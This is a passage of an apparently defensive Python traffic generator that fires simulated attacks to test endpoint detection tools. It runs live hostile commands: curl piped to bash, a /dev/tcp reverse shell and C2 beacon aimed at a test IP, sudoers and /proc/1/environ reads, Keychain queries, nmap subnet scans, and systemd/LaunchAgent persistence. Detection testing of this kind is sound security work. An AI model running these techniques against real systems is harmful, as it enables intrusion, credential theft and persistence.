def attack_curl_pipe_bash():
    """Download from httpbin and pipe directly to bash — curl|bash pattern detection."""
    url = "https://httpbin.org/get"
    log.warning("%s curl-pipe-bash — download and pipe to bash → %s", _tag("TEST-ATTACK"), url)
    rc, out = run_cmd(
        ["bash", "-c", f"curl -s {url} | bash"],
        timeout=15,
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])


def attack_reverse_shell_sim():
    """Simulate bash reverse shell TCP redirect to RFC 5737 IP — fails safely, generates telemetry."""
    host = "192.0.2.100"
    port = 4444
    log.warning(
        "%s Reverse shell simulation → %s:%d (RFC 5737 — connection will fail, attempt generates telemetry)",
        _tag("TEST-ATTACK"), host, port,
    )
    rc, out = run_cmd(
        ["bash", "-c", f"bash -i >& /dev/tcp/{host}/{port} 0>&1"],
        timeout=5,
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])


def attack_sudo_recon():
    """Enumerate sudo permissions — privilege escalation recon."""
    cmds = [
        ["sudo", "-l"],
        ["sudo", "-n", "-l"],
        ["cat", "/etc/sudoers"],
        ["ls", "/etc/sudoers.d"],
    ]
    sample = random.sample(cmds, random.randint(2, 3))
    log.warning("%s Sudo recon — %d commands", _tag("TEST-ATTACK"), len(sample))
    for cmd in sample:
        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
        rc, out = run_cmd(cmd, timeout=8)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")


def attack_systemd_persistence():
    """Write a systemd user service file, enable it, then clean up — persistence simulation."""
    service_dir = os.path.expanduser("~/.config/systemd/user")
    service_path = os.path.join(service_dir, "sentinelone-test.service")
    service_content = (
        "[Unit]\n"
        "Description=[TEST-ATTACK] SentinelOne persistence simulation\n"
        "[Service]\n"
        "ExecStart=/bin/echo [TEST-ATTACK] systemd service executed\n"
        "[Install]\n"
        "WantedBy=default.target\n"
    )
    log.warning("%s systemd user persistence — write/enable/disable/remove service", _tag("TEST-ATTACK"))
    try:
        os.makedirs(service_dir, exist_ok=True)
        with open(service_path, "w") as f:
            f.write(service_content)
        log.warning("%s  service file written: %s", _tag("TEST-ATTACK"), service_path)

        rc, out = run_cmd(["systemctl", "--user", "daemon-reload"], timeout=10)
        log.warning("%s  daemon-reload rc=%d", _tag("TEST-ATTACK"), rc)

        rc, out = run_cmd(["systemctl", "--user", "enable", "sentinelone-test"], timeout=10)
        log.warning("%s  enable rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])

        rc, out = run_cmd(["systemctl", "--user", "disable", "sentinelone-test"], timeout=10)
        log.warning("%s  disable rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:80])

        try:
            os.remove(service_path)
            log.warning("%s  service file removed", _tag("TEST-ATTACK"))
        except OSError as exc:
            log.warning("%s  remove error: %s", _tag("TEST-ATTACK"), exc)

        rc, out = run_cmd(["systemctl", "--user", "daemon-reload"], timeout=10)
        log.warning("%s  final daemon-reload rc=%d", _tag("TEST-ATTACK"), rc)

    except PermissionError as exc:
        log.warning("%s  PermissionError (expected on hardened systems): %s", _tag("TEST-ATTACK"), exc)
    except Exception as exc:
        log.warning("%s  error: %s", _tag("TEST-ATTACK"), exc)


def attack_nmap_scan():
    """Run nmap top-ports scan against the local /24 subnet."""
    if not _which("nmap"):
        log.warning("%s nmap not found — skipping nmap scan", _tag("TEST-ATTACK"))
        return
    subnet = get_local_subnet()
    target = f"{subnet}.0/24"
    log.warning("%s nmap scan — %s top 20 ports -T4", _tag("TEST-ATTACK"), target)
    rc, out = run_cmd(["nmap", "--top-ports", "20", "-T4", target], timeout=45)
    log.warning("%s  rc=%d  %d result lines", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)


def attack_proc_access():
    """Attempt to read sensitive /proc/1 files — process memory recon simulation."""
    paths = [
        "/proc/1/maps",
        "/proc/1/cmdline",
        "/proc/1/environ",
        "/proc/1/status",
    ]
    log.warning("%s /proc/1 access — process memory recon", _tag("TEST-ATTACK"))
    for path in paths:
        log.warning("%s  open: %s", _tag("TEST-ATTACK"), path)
        try:
            with open(path, "rb") as f:
                data = f.read(512)
            log.warning("%s    → READ %d bytes", _tag("TEST-ATTACK"), len(data))
        except PermissionError:
            log.warning("%s    → DENIED (expected)", _tag("TEST-ATTACK"))
        except FileNotFoundError:
            log.warning("%s    → not found", _tag("TEST-ATTACK"))
        except Exception as exc:
            log.warning("%s    → %s", _tag("TEST-ATTACK"), exc)

# ---------------------------------------------------------------------------
# Attack simulations — RHEL/CentOS specific
# ---------------------------------------------------------------------------

def attack_rpm_verify():
    log.warning("%s rpm -Va — package integrity check", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["rpm", "-Va", "--nodeps"], timeout=20)
    log.warning("%s  rc=%d  %d discrepancies", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)


def attack_yum_recon():
    tool = "dnf" if _which("dnf") else "yum"
    log.warning("%s %s recon — package enumeration", _tag("TEST-ATTACK"), tool)
    rc, out = run_cmd([tool, "list", "installed"], timeout=20)
    log.warning("%s  rc=%d  %d packages", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)

# ---------------------------------------------------------------------------
# Attack simulations — Debian/Kali specific
# ---------------------------------------------------------------------------

def attack_dpkg_recon():
    log.warning("%s dpkg recon — package enumeration", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["dpkg", "-l"], timeout=15)
    log.warning("%s  rc=%d  %d packages", _tag("TEST-ATTACK"), rc,
                len(out.splitlines()) if out else 0)


def attack_kali_tool_probe():
    tools = ["nmap", "metasploit", "msfconsole", "hydra", "john", "hashcat",
             "sqlmap", "burpsuite", "aircrack-ng", "nikto", "gobuster"]
    sample = random.sample(tools, 4)
    log.warning("%s Offensive tool probe — %s", _tag("TEST-ATTACK"), sample)
    for tool in sample:
        log.warning("%s  %s → %s", _tag("TEST-ATTACK"), tool,
                    "FOUND" if _which(tool) else "not present")

# ---------------------------------------------------------------------------
# Attack simulations — macOS specific
# ---------------------------------------------------------------------------

def attack_keychain_access():
    log.warning("%s Keychain access — credential harvesting simulation", _tag("TEST-ATTACK"))
    rc, out = run_cmd(["security", "list-keychains"], timeout=8)
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")
    rc2, _ = run_cmd(["security", "find-generic-password", "-s", "com.apple.terminal"], timeout=8)
    log.warning("%s  find-generic-password rc=%d", _tag("TEST-ATTACK"), rc2)


def attack_launchd_persistence():
    plist_path = os.path.expanduser(
        "~/Library/LaunchAgents/com.test.sentinelone.simulation.plist"
    )
    plist_content = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0"><dict>\n'
        '  <key>Label</key><string>com.test.sentinelone.simulation</string>\n'
        '  <key>ProgramArguments</key><array>'
        '<string>/bin/echo</string><string>[TEST-ATTACK] LaunchAgent</string></array>\n'
        '  <key>RunAtLoad</key><true/>\n'
        '</dict></plist>'
    )
    log.warning("%s LaunchAgent persistence — write+load+remove", _tag("TEST-ATTACK"))
    try:
        os.makedirs(os.path.dirname(plist_path), exist_ok=True)
        with open(plist_path, "w") as f:
            f.write(plist_content)
        rc, out = run_cmd(["launchctl", "load", plist_path], timeout=10)
        log.warning("%s  load rc=%d", _tag("TEST-ATTACK"), rc)
        run_cmd(["launchctl", "unload", plist_path], timeout=10)
        os.remove(plist_path)
        log.warning("%s  plist removed", _tag("TEST-ATTACK"))
    except Exception as exc:
        log.debug("%s  error: %s", _tag("TEST-ATTACK"), exc)


def attack_macos_recon():
    cmds = [
        ["dscl", ".", "-list", "/Users"],
        ["networksetup", "-listallnetworkservices"],
        ["system_profiler", "SPSoftwareDataType"],
        ["defaults", "read", "/Library/Preferences/com.apple.loginwindow"],
    ]
    cmd = random.choice(cmds)
    log.warning("%s macOS recon — %s", _tag("TEST-ATTACK"), " ".join(cmd))
    rc, out = run_cmd(cmd, timeout=10)
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")


def attack_tcc_access():
    """Attempt to open TCC.db — macOS app permission database access simulation."""
    paths = [
        os.path.expanduser("~/Library/Application Support/com.apple.TCC/TCC.db"),
        "/Library/Application Support/com.apple.TCC/TCC.db",
    ]
    log.warning("%s TCC.db access — macOS app permission database", _tag("TEST-ATTACK"))
    for path in paths:
        log.warning("%s  open: %s", _tag("TEST-ATTACK"), path)
        try:
            with open(path, "rb") as f:
                data = f.read(512)
            log.warning("%s    → READ %d bytes", _tag("TEST-ATTACK"), len(data))
        except PermissionError:
            log.warning("%s    → DENIED (expected)", _tag("TEST-ATTACK"))
        except FileNotFoundError:
            log.warning("%s    → not found", _tag("TEST-ATTACK"))
        except Exception as exc:
            log.warning("%s    → %s", _tag("TEST-ATTACK"), exc)


def attack_gatekeeper_recon():
    """Query Gatekeeper and code-signing status — macOS security policy recon."""
    cmds = [
        ["spctl", "--status"],
        ["spctl", "--assess", "--type", "exec", "/bin/bash"],
        ["codesign", "--verify", "--verbose", "/bin/bash"],
        ["csrutil", "status"],
    ]
    log.warning("%s Gatekeeper/SIP recon — macOS security policy enumeration", _tag("TEST-ATTACK"))
    for cmd in cmds:
        log.warning("%s  exec: %s", _tag("TEST-ATTACK"), " ".join(cmd))
        rc, out = run_cmd(cmd, timeout=10)
        log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120] if out else "(empty)")


def attack_osascript():
    """Execute a shell command via osascript — macOS scripting bridge abuse."""
    log.warning("%s osascript shell execution — scripting bridge", _tag("TEST-ATTACK"))
    rc, out = run_cmd(
        ["osascript", "-e", 'do shell script "echo [TEST-ATTACK] osascript execution"'],
        timeout=10,
    )
    log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])

# ---------------------------------------------------------------------------
# Build OS-appropriate attack list
# ---------------------------------------------------------------------------

_ATTACKS_COMMON = [
    attack_eicar_drop,
    attack_eicar_multi_drop,
    attack_recon_commands,
    attack_credential_file_access,
    attack_credential_read,
    attack_port_scan_localhost,
    attack_subnet_scan,
    attack_external_c2_connect,
    attack_dns_c2_domains,
    attack_dga_dns,
    attack_script_in_temp,
]

_ATTACKS_BY_OS = {
    "windows": [
        attack_cmd_chain,
        attack_powershell_encoded,
        attack_powershell_download_cradle,
        attack_lolbas_certutil,
        attack_lolbas_mshta,
        attack_lolbas_wscript,
        attack_lolbas_rundll32,
        attack_windows_registry_enum,
        attack_registry_persistence,
        attack_scheduled_task,
        attack_vss_recon,
        attack_lsass_access,
        attack_powershell_iex,
    ],
    "rhel": [
        attack_bash_chain,
        attack_bash_encoded,
        attack_curl_download_cradle,
        attack_shadow_read,
        attack_suid_search,
        attack_cron_persistence_attempt,
        attack_ptrace_attempt,
        attack_sensitive_dir_traversal,
        attack_rpm_verify,
        attack_yum_recon,
        attack_curl_pipe_bash,
        attack_reverse_shell_sim,
        attack_sudo_recon,
        attack_systemd_persistence,
        attack_nmap_scan,
        attack_proc_access,
    ],
    "debian": [
        attack_bash_chain,
        attack_bash_encoded,
        attack_curl_download_cradle,
        attack_shadow_read,
        attack_suid_search,
        attack_cron_persistence_attempt,
        attack_ptrace_attempt,
        attack_sensitive_dir_traversal,
        attack_dpkg_recon,
        attack_kali_tool_probe,
        attack_curl_pipe_bash,
        attack_reverse_shell_sim,
        attack_sudo_recon,
        attack_systemd_persistence,
        attack_nmap_scan,
        attack_proc_access,
    ],
    "macos": [
        attack_bash_chain,
        attack_bash_encoded,
        attack_curl_download_cradle,
        attack_shadow_read,
        attack_suid_search,
        attack_sensitive_dir_traversal,
        attack_keychain_access,
        attack_launchd_persistence,
        attack_macos_recon,
        attack_curl_pipe_bash,
        attack_reverse_shell_sim,
        attack_sudo_recon,
        attack_nmap_scan,
        attack_tcc_access,
        attack_gatekeeper_recon,
        attack_osascript,
    ],
    "linux": [
        attack_bash_chain,
        attack_bash_encoded,
        attack_curl_download_cradle,
        attack_shadow_read,
        attack_suid_search,
        attack_cron_persistence_attempt,
        attack_ptrace_attempt,
        attack_sensitive_dir_traversal,
        attack_curl_pipe_bash,
        attack_reverse_shell_sim,
        attack_sudo_recon,
        attack_systemd_persistence,
        attack_nmap_scan,
        attack_proc_access,
    ],
}

ATTACK_ACTIONS = _ATTACKS_COMMON + _ATTACKS_BY_OS.get(OS, [])

# ---------------------------------------------------------------------------
# C2 Beacon thread
# ---------------------------------------------------------------------------

def _beacon_worker(host: str, port: int, interval: float) -> None:
    log.info("Beacon thread started → %s:%d every %.0fs", host, port, interval)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            rc = s.connect_ex((host, port))
            s.close()
            log.warning("%s Beacon check-in → %s:%d  %s", _tag("TEST-ATTACK"), host, port,
                        "connected" if rc == 0 else f"no response (rc={rc})")
        except Exception as exc:
            log.debug("Beacon error: %s", exc)
        time.sleep(interval)


def start_beacon(host: str, port: int, interval: float) -> None:
    t = threading.Thread(target=_beacon_worker, args=(host, port, interval), daemon=True)
    t.start()

# ---------------------------------------------------------------------------
# Scheduler
# ---------------------------------------------------------------------------

def jitter(seconds: float, pct: float = 0.3) -> float:
    delta = seconds * pct
    return max(1.0, seconds + random.uniform(-delta, delta))


def run_loop(
    normal_interval: float,
    attack_interval: float,
    attack_probability: float,
    max_runtime: float | None,
    beacon_host: str | None,
    beacon_port: int,
    beacon_interval: float,
) -> None:
    start = time.monotonic()
    cycle = 0

    if beacon_host:
        start_beacon(beacon_host, beacon_port, beacon_interval)

    log.info("=" * 70)
    log.info("  SentinelOne / CrowdStrike Traffic Generator — SIMULATION STARTED")
    log.info("  OS profile      : %s  (%s)", OS, platform.platform())
    log.info("  Normal interval : %.0fs  Attack interval : %.0fs", normal_interval, attack_interval)
    log.info("  Attack probability per window : %.0f%%", attack_probability * 100)
    log.info("  Attack pool : %d actions", len(ATTACK_ACTIONS))
    if beacon_host:
        log.info("  Beacon : %s:%d every %.0fs", beacon_host, beacon_port, beacon_interval)
    log.info("=" * 70)

    next_normal = time.monotonic()
    next_attack = time.monotonic() + attack_interval

    try:
        while True:
            now = time.monotonic()

            if max_runtime and (now - start) >= max_runtime:
                log.info("Max runtime reached — stopping.")
                break

            if now >= next_normal:
                action = pick_normal()
                try:
                    action()
                except Exception as exc:
                    log.debug("Normal action error: %s", exc)
                next_normal = now + jitter(normal_interval)

            if now >= next_attack:
                if random.random() < attack_probability:
                    action = random.choice(ATTACK_ACTIONS)
                    log.warning("-" * 60)
                    log.warning("  ATTACK SIMULATION — %s", action.__name__)
                    log.warning("-" * 60)
                    try:
                        action()
                    except Exception as exc:
                        log.debug("Attack action error: %s", exc)
                else:
                    log.info("%s Attack window — no attack this cycle", _tag("NORMAL"))
                next_attack = now + jitter(attack_interval)

            cycle += 1
            time.sleep(0.5)

    except KeyboardInterrupt:
        log.info("Interrupted — stopping.")

    log.info("=" * 70)
    log.info("  Traffic Generator STOPPED after %d cycles", cycle)
    log.info("=" * 70)

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="OS-aware endpoint traffic simulator for SentinelOne / CrowdStrike testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default: normal traffic every 30s, attack window every 5 min, 40% attack rate
  python traffic_generator.py

  # Aggressive: attack every 2 min, guaranteed to fire, with C2 beacon
  python traffic_generator.py --attack-interval 120 --attack-prob 1.0 --beacon

  # Normal traffic only, no attacks
  python traffic_generator.py --attack-prob 0

  # Run for 1 hour, log to file
  python traffic_generator.py --runtime 3600 --log-file sim.log

  # Custom beacon target (e.g. your own test server)
  python traffic_generator.py --beacon --beacon-host 10.0.0.99 --beacon-port 4444
""",
    )
    parser.add_argument("--normal-interval", type=float, default=30.0, metavar="SEC",
                        help="Seconds between normal traffic events (default: 30)")
    parser.add_argument("--attack-interval", type=float, default=300.0, metavar="SEC",
                        help="Seconds between attack simulation windows (default: 300)")
    parser.add_argument("--attack-prob", type=float, default=0.4, metavar="0-1",
                        help="Probability [0-1] of an attack firing each window (default: 0.4)")
    parser.add_argument("--runtime", type=float, default=None, metavar="SEC",
                        help="Stop after this many seconds (default: run forever)")
    parser.add_argument("--beacon", action="store_true",
                        help="Enable background C2 beacon simulation")
    parser.add_argument("--beacon-host", default="192.0.2.100", metavar="IP",
                        help="Beacon target host (default: 192.0.2.100, RFC 5737 test IP)")
    parser.add_argument("--beacon-port", type=int, default=4444, metavar="PORT",
                        help="Beacon target port (default: 4444)")
    parser.add_argument("--beacon-interval", type=float, default=60.0, metavar="SEC",
                        help="Seconds between beacon check-ins (default: 60)")
    parser.add_argument("--verbose", action="store_true", help="Show DEBUG-level output")
    parser.add_argument("--log-file", metavar="PATH", help="Also write logs to this file")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.log_file:
        fh = logging.FileHandler(args.log_file)
        fh.setFormatter(logging.Formatter(LOG_FMT, datefmt="%Y-%m-%d %H:%M:%S"))
        logging.getLogger().addHandler(fh)
        log.info("Logging to file: %s", args.log_file)

    if not (0.0 <= args.attack_prob <= 1.0):
        parser.error("--attack-prob must be between 0 and 1")

    run_loop(
        normal_interval=args.normal_interval,
        attack_interval=args.attack_interval,
        attack_probability=args.attack_prob,
        max_runtime=args.runtime,
        beacon_host=args.beacon_host if args.beacon else None,
        beacon_port=args.beacon_port,
        beacon_interval=args.beacon_interval,
    )


if __name__ == "__main__":
    main()
